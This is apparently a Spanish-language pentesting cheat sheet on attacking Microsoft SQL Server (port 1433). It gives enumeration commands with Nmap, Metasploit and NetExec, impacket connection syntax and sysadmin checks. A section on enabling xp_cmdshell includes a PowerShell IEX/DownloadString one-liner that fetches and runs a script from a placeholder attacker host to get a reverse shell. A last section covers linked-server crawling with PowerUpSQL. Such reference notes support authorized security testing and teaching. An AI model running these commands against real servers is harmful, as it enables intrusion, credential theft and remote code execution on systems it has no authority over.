---
title: MSSQL (Microsoft SQL Server - Puerto 1433)
pubDate: '2026-08-26'
---

## ¿Qué es MSSQL?
**Microsoft SQL Server (MSSQL)** es el motor de base de datos relacional de Microsoft, ampliamente desplegado en entornos corporativos y aplicaciones Windows. A diferencia de MySQL, cuenta con integración nativa con Active Directory y soporte para autenticación NTLM/Kerberos.

### Riesgos principales
1. **Ejecución de Comandos del SO (`xp_cmdshell`):** Permite ejecutar binarios y comandos de Windows directamente desde la consola SQL.
2. **Autenticación Integrada de Windows (`-windows-auth`):** Permite autenticarse usando credenciales de dominio.
3. **Escalada de Privilegios y Linked Servers:** Vectores para pivotar hacia otros servidores vinculados con privilegios de `sysadmin`.

---

## 🔎 1. Enumeración y Scripts Nmap

```bash
# Escaneo de reconocimiento exhaustivo con Nmap
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <TARGET_IP>

# Metasploit Ping y Detección de Instancias
msf6 > use auxiliary/scanner/mssql/mssql_ping
msf6 > set RHOSTS <TARGET_IP>
msf6 > run

# Validación de Credenciales con NetExec
nxc mssql <TARGET_IP> -u usuario -p password
```

---

## 🚀 2. Conexión e Interacción con `mssqlclient.py`

```bash
# Conexión usando Autenticación de Windows (Dominio)
impacket-mssqlclient DOMINIO/usuario:'password'@<TARGET_IP> -windows-auth
python3 mssqlclient.py Administrator@<TARGET_IP> -windows-auth

# Conexión con usuario local de la base de datos (sa)
impacket-mssqlclient sa:'password'@<TARGET_IP>
```

### Consultas SQL Esenciales en MSSQL:
```sql
select @@version;                                    -- Ver versión del servidor MSSQL
select user_name();                                  -- Usuario actual en la DB
select is_srvrolemember('sysadmin');                 -- Comprobar si somos administradores (1 = Sí)
select name from sys.databases;                      -- Listar todas las bases de datos
select name from <db_name>.sys.tables;               -- Listar tablas de una base de datos
```

---

## ⚡ 3. Ejecución de Comandos (`xp_cmdshell`)

Si el usuario cuenta con el rol de `sysadmin`, se puede habilitar y ejecutar comandos de Windows:

```sql
-- 1. Habilitar xp_cmdshell en la configuración
enable_xp_cmdshell

-- 2. Ejecutar comandos de sistema
xp_cmdshell whoami
xp_cmdshell ipconfig /all

-- 3. Reverse Shell vía PowerShell
xp_cmdshell "powershell IEX(New-Object Net.WebClient).DownloadString('http://<IP_ATACANTE>/shell.ps1')"
```

---

## 🛠️ 4. Auditoría Interna con PowerUpSQL

En auditorías internas desde una máquina Windows comprometida:
```powershell
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLServerLinkCrawl -Instance <INSTANCIA_MSSQL>   # Mapear servidores vinculados (Linked Servers)
```
